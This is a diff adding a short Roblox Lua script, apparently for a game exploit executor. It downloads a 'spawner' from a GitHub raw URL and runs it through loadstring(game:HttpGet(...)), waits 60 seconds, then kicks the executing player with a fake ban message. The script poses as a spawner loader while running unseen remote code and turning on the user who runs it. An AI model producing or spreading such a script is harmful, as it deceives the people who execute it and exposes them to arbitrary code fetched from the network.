@@ -1,0 +1,11 @@
+-- Load external spawner script
+local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/allaturk1234/Loading.UI/refs/heads/main/Spawner.loadXTRF"))()
+
+-- Wait 60 seconds
+task.wait(60)
+
+-- Kick the executing player with custom message
+local player = game:GetService("Players").LocalPlayer
+if player then
+    player:Kick("You've been banned for acting sus ByeBye ENZOMARVERICK")
+end
